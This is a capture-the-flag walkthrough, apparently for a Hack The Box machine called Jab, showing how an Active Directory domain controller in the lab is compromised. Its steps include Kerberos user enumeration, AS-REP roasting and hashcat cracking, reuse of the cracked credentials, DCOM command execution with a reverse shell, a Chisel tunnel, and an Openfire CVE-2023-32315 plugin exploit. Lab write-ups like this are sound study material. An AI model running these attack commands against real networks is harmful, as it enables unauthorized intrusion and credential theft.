# Jab - Active Directory Exploitation Walkthrough

This walkthrough demonstrates the full exploitation of the **Jab** Active Directory lab environment. The assessment includes user enumeration, AS-REP roasting, SMB enumeration, BloodHound-based lateral movement, and remote code execution through Openfire (CVE-2023-32315) to achieve Domain Admin access.

---

## 🧠 Lab Information

- **IP Address:** 10.10.11.4
- **Domain:** jab.htb
- **Domain Controller:** dc01.jab.htb
- **Services:** Kerberos, SMB, LDAP, XMPP/Openfire

---

## 🔍 Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA nmap 10.10.11.4

Key Ports:
88, 389, 636, 445 – Kerberos, LDAP, SMB
5222, 5269, 7070, 7443, 7777 – XMPP (Openfire)

Add to /etc/hosts:
10.10.11.4 jab.htb dc01.jab.htb
🔐 Kerberos & XMPP Enumeration
Kerberos User Enumeration
bash
Copy
Edit
kerbrute userenum --dc dc01.jab.htb -d jab.htb usernames.txt -o kerbrute.txt

Thousands of users discovered.

AS-REP Roasting
bash
Copy
Edit
impacket-GetNPUsers jab.htb/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
Crack Hash with Hashcat
bash
Copy
Edit
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
Cracked Credential:

jmontgomery : Midnight_121

💬 XMPP Enumeration (Pidgin)
Install and open Pidgin.

Create new XMPP account using cracked credentials.

Join chat rooms to discover additional usernames and messages.

Found credentials:

svc_openfire : !@#$%^&*(1qazxsw)

📁 SMB Enumeration
bash
Copy
Edit
smbmap -u svc_openfire -p '!@#$%^&*(1qazxsw)' -H 10.10.11.4
Limited access, no sensitive data found.

🧠 BloodHound Analysis
Data Collection
bash
Copy
Edit
bloodhound-python -u svc_openfire -p '!@#$%^&*(1qazxsw)' -d jab.htb -dc dc01.jab.htb -c all -ns 10.10.11.4
zip -r bloodhound.zip bloodhound/
BloodHound GUI (Neo4j)
Upload collected data.

Identify attack path using DCOM and Remote Code Execution privileges.

🧨 Remote Code Execution via DCOM
Reverse Shell Payload
Generate a PowerShell reverse shell from revshells.com, then:

bash
Copy
Edit
impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw)@dc01.jab.htb' '<PowerShellCommand>'
Start listener:

bash
Copy
Edit
rlwrap nc -nlvp 6658
✅ User Flag: 58b27f9faaec3dfdb2a94dad6a1e2175

🔁 Pivoting with Chisel
Setup Chisel Tunnel
Server (Attacker):

bash
Copy
Edit
chisel server -p 9999 --reverse
Client (Victim):

bash
Copy
Edit
chisel client <YourIP>:9999 R:9090:127.0.0.1:9090
Access Openfire admin: http://127.0.0.1:9090

⚙️ Exploiting Openfire (CVE-2023-32315)
Exploit Setup
bash
Copy
Edit
git clone https://github.com/miko550/CVE-2023-32315.git
cd CVE-2023-32315
pip3 install -r requirements.txt
Upload Malicious Plugin
Login to Openfire admin panel.

Use exploit to upload a reverse shell plugin.

Catch Shell
bash
Copy
Edit
rlwrap nc -nlvp 4444
✅ Root Flag: 8f826f76eb871e0566058e6580760e8e

✅ Summary
| Step                 | Technique                     | Result                          |
| -------------------- | ----------------------------- | ------------------------------- |
| User Enumeration     | Kerbrute, AS-REP roasting     | Found jmontgomery credentials   |
| XMPP Enumeration     | Pidgin                        | Found svc\_openfire credentials |
| Lateral Movement     | BloodHound (DCOM)             | Executed shell on DC            |
| Privilege Escalation | Openfire RCE (CVE-2023-32315) | Gained SYSTEM shell             |
| Flags Captured       | User & Root                   | Complete compromise             |

Author: Farhanahmad Quraishi
